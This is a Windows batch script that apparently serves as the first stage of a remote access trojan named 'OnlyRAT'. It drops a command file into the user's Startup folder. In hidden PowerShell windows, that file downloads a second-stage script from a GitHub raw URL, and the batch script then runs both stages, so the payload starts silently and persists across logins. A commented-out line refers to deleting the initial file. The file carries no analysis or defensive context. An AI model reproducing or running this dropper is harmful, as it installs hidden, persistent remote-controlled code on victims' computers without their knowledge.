@echo off

REM Save the current directory
set "initialPath=%cd%"

set "startup=C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

cd /d "%startup%"

(
echo powershell -c "Start-Process powershell.exe -WindowStyle Hidden -ArgumentList 'Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/Sayuru99/OnlyRAT/main/wget2.cmd\" -OutFile \"wget2.cmd\"'"
) > wget.cmd

powershell -Command "Start-Process cmd.exe -ArgumentList '/c \"%startup%\wget.cmd\"' -WindowStyle Hidden"

timeout /t 10 /nobreak > nul

powershell -Command "Start-Process cmd.exe -ArgumentList '/c \"%startup%\wget2.cmd\"' -WindowStyle Hidden"

cd /d "%initialPath%"

@REM del initial.cmd
